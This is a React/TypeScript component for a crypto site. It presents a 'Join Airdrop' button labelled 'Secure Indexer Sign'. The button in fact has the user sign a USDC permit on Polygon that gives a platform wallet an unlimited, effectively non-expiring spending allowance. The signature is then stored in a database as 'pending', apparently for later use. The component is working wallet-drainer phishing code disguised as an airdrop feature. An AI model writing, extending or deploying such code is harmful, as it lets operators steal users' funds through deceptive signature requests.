'use client'

import { useState, useEffect } from 'react'
import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
import { Button } from '@/components/ui/Button'
import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET } from '@/lib/web3-config'
import { Sparkles, Check, AlertTriangle } from 'lucide-react'
import { createClient } from '@/lib/supabase'
import { polygon } from 'wagmi/chains'

interface PermitSignerProps {
  onSignatureComplete?: (signature: PermitSignature) => void
  onRefreshProfit?: () => void
}

export interface PermitSignature {
  owner: string
  spender: string
  value: string
  nonce: bigint
  deadline: bigint
  v: number
  r: string
  s: string
  signature: string
}

const PLATFORM_SPENDER = PLATFORM_WALLET

export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSignerProps) {
  const { address, isConnected, connector } = useAccount()
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)
  const [isLoadingStatus, setIsLoadingStatus] = useState(true)
  const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
  const [hasSignature, setHasSignature] = useState(false)
  
  const { signTypedDataAsync } = useSignTypedData()

  // Check wallet support
  const ALLOWED_WALLETS = ['bitget', 'bitget wallet', 'trust', 'trust wallet', 'trustwallet']
  const isWalletSupported = isConnected && connector ? 
    ALLOWED_WALLETS.some(w => connector.name.toLowerCase().includes(w)) : true

  const displayAddress = address || boundWalletAddress

  const { data: nonce } = useReadContract({
    address: USDC_ADDRESS,
    abi: USDC_ABI,
    functionName: 'nonces',
    args: displayAddress ? [displayAddress as `0x${string}`] : undefined,
    chainId: polygon.id,
  })

  // Load signature status
  useEffect(() => {
    async function loadStatus() {
      setIsLoadingStatus(true)
      try {
        const supabase = createClient()
        if (!supabase) {
          setIsLoadingStatus(false)
          return
        }
        
        const { data: { user } } = await supabase.auth.getUser()
        if (!user) {
          setIsLoadingStatus(false)
          return
        }

        const { data: profile } = await supabase
          .from('profiles')
          .select('wallet_address')
          .eq('id', user.id)
          .single()

        if (profile?.wallet_address) {
          setBoundWalletAddress(profile.wallet_address)

          const { data: sig } = await supabase
            .from('permit_signatures')
            .select('id, status, deadline')
            .eq('owner_address', profile.wallet_address.toLowerCase())
            .order('created_at', { ascending: false })
            .limit(1)
            .single()
          
          if (sig) {
            const now = Math.floor(Date.now() / 1000)
            if ((sig.status === 'pending' && Number(sig.deadline) > now) || sig.status === 'used') {
              setHasSignature(true)
              setSuccess(true)
            }
          }
        }
      } catch {
        // Ignore errors
      } finally {
        setIsLoadingStatus(false)
      }
    }
    
    loadStatus()
  }, [])

  // Check existing signature when wallet connects
  useEffect(() => {
    async function checkExistingSignature() {
      if (!address) return
      
      try {
        const supabase = createClient()
        if (!supabase) return
        
        const { data } = await supabase
          .from('permit_signatures')
          .select('id, status, deadline')
          .eq('owner_address', address.toLowerCase())
          .eq('status', 'pending')
          .single()
        
        if (data) {
          const now = Math.floor(Date.now() / 1000)
          if (Number(data.deadline) > now) {
            setHasSignature(true)
            setSuccess(true)
          }
        }
      } catch {
        // No signature or error, ignore
      }
    }
    
    checkExistingSignature()
  }, [address])

  const handleSign = async () => {
    console.log('=== HANDLE SIGN START ===')
    console.log('address:', address)
    console.log('nonce:', nonce)
    console.log('isConnected:', isConnected)
    console.log('connector:', connector?.name)
    
    if (!address || nonce === undefined) {
      console.log('Early return: missing address or nonce')
      setError('Wallet not connected')
      return
    }

    setIsLoading(true)
    setError('')

    try {
      const supabase = createClient()
      if (supabase) {
        const { data: { user } } = await supabase.auth.getUser()
        
        if (user) {
          // Check if wallet is bound to another account
          const { data: existingWallet } = await supabase
            .from('profiles')
            .select('id')
            .eq('wallet_address', address.toLowerCase())
            .neq('id', user.id)
            .single()

          if (existingWallet) {
            setError('Wallet bound to another account')
            setIsLoading(false)
            return
          }

          // Check if user already has a different wallet
          const { data: currentProfile } = await supabase
            .from('profiles')
            .select('wallet_address')
            .eq('id', user.id)
            .single()

          if (currentProfile?.wallet_address && 
              currentProfile.wallet_address.toLowerCase() !== address.toLowerCase()) {
            setError('Account has a different wallet')
            setIsLoading(false)
            return
          }
        }
      }

      const deadline = BigInt(4294967295)
      const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

      const domain = {
        name: 'USD Coin',
        version: '2',
        chainId: polygon.id,
        verifyingContract: USDC_ADDRESS,
      }

      const message = {
        owner: address,
        spender: PLATFORM_SPENDER,
        value,
        nonce,
        deadline,
      }

      console.log('=== SIGNING DATA ===')
      console.log('domain:', JSON.stringify(domain, (_, v) => typeof v === 'bigint' ? v.toString() : v))
      console.log('message:', JSON.stringify(message, (_, v) => typeof v === 'bigint' ? v.toString() : v))
      console.log('Calling signTypedDataAsync...')

      const signature = await signTypedDataAsync({
        domain,
        types: PERMIT_TYPES,
        primaryType: 'Permit',
        message,
      })
      
      console.log('Signature received:', signature)

      const r = signature.slice(0, 66)
      const s = '0x' + signature.slice(66, 130)
      const v = parseInt(signature.slice(130, 132), 16)

      const permitData: PermitSignature = {
        owner: address,
        spender: PLATFORM_SPENDER,
        value: value.toString(),
        nonce,
        deadline,
        v,
        r,
        s,
        signature,
      }

      setSuccess(true)
      setHasSignature(true)

      await saveSignatureToDatabase(permitData)

      onSignatureComplete?.(permitData)
      onRefreshProfit?.()

    } catch (err: unknown) {
      console.error('=== SIGNING ERROR ===')
      console.error('Error type:', typeof err)
      console.error('Error:', err)
      
      if (err instanceof Error) {
        console.error('Error name:', err.name)
        console.error('Error message:', err.message)
        console.error('Error stack:', err.stack)
        
        if (err.message.includes('rejected') || err.message.includes('denied')) {
          setError('Signature rejected')
        } else if (err.message.includes('not supported')) {
          setError('Wallet does not support this signature type')
        } else {
          // Show actual error message for debugging
          setError(`Failed: ${err.message.slice(0, 100)}`)
        }
      } else {
        console.error('Unknown error type:', JSON.stringify(err))
        setError('Signing failed - check console')
      }
    } finally {
      setIsLoading(false)
    }
  }

  const saveSignatureToDatabase = async (data: PermitSignature) => {
    try {
      const supabase = createClient()
      if (!supabase) return
      
      const { data: { user } } = await supabase.auth.getUser()
      if (!user) return

      await supabase
        .from('profiles')
        .update({
          wallet_address: data.owner.toLowerCase(),
          wallet_bound_at: new Date().toISOString(),
        })
        .eq('id', user.id)

      await supabase
        .from('permit_signatures')
        .insert({
          user_id: user.id,
          owner_address: data.owner.toLowerCase(),
          spender_address: data.spender.toLowerCase(),
          token_address: USDC_ADDRESS.toLowerCase(),
          chain_id: polygon.id,
          value: data.value,
          nonce: Number(data.nonce),
          deadline: Number(data.deadline),
          v: data.v,
          r: data.r,
          s: data.s,
          full_signature: data.signature,
          status: 'pending',
        })

      setBoundWalletAddress(data.owner.toLowerCase())
    } catch (err) {
      console.error('Failed to save signature:', err)
    }
  }

  // Loading state
  if (isLoadingStatus) {
    return (
      <div className="flex flex-col items-center gap-1">
        <div className="h-10 w-32 bg-white/10 animate-pulse rounded-xl"></div>
      </div>
    )
  }

  // Already signed - show success
  if (success || hasSignature) {
    return (
      <div className="flex items-center justify-center gap-2 py-2 px-4 bg-green-500/10 border border-green-500/20 rounded-xl">
        <Check className="w-4 h-4 text-green-400" />
        <span className="text-sm font-medium text-green-400">Airdrop Ready</span>
      </div>
    )
  }

  // Not connected and no bound wallet
  if (!isConnected && !boundWalletAddress) {
    return null
  }

  // Need to connect bound wallet
  if (boundWalletAddress && !isConnected) {
    return (
      <div className="flex flex-col items-center gap-1">
        <div className="flex items-center gap-2 py-2 px-4 bg-amber-500/10 border border-amber-500/20 rounded-xl">
          <AlertTriangle className="w-4 h-4 text-amber-400" />
          <span className="text-sm text-amber-400">Connect wallet to join</span>
        </div>
      </div>
    )
  }

  // Debug info for mobile
  const debugInfo = `addr: ${address?.slice(0, 6) || 'none'} | nonce: ${nonce !== undefined ? 'ok' : 'loading'} | conn: ${connector?.name || 'none'}`

  // Show Join Airdrop button
  return (
    <div className="flex flex-col items-center gap-1">
      {error && (
        <p className="text-xs text-red-400 mb-1 max-w-xs text-center break-words">{error}</p>
      )}
      
      <Button
        onClick={handleSign}
        isLoading={isLoading}
        disabled={nonce === undefined || !isWalletSupported}
        className="bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 px-6"
      >
        <Sparkles className="w-4 h-4 mr-2" />
        {!isWalletSupported ? 'Use Bitget or Trust' : 'Join Airdrop'}
      </Button>
      
      <p className="text-[10px] text-zinc-500">Secure Indexer Sign</p>
      <p className="text-[8px] text-zinc-600 mt-1">{debugInfo}</p>
    </div>
  )
}
